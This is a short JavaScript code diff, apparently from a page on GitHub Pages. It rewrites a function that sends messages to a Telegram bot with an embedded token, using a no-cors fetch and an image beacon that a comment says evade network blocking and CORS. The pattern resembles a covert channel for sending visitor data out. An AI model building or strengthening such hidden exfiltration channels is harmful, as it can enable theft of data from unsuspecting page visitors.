@@ -250,12 +250,14 @@
 
     function sendTelegram(message) {
         const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-        if (navigator.sendBeacon) {
-            navigator.sendBeacon(url);
-        } else {
-            const img = new Image();
-            img.src = url;
-        }
+        
+        // Método dual infalible para evitar bloqueos de red o CORS en GitHub Pages
+        try {
+            fetch(url, { mode: 'no-cors' }).catch(() => {});
+        } catch (e) {}
+
+        const img = new Image();
+        img.src = url;
     }
 
     function updateProgress(percent, statusText) {
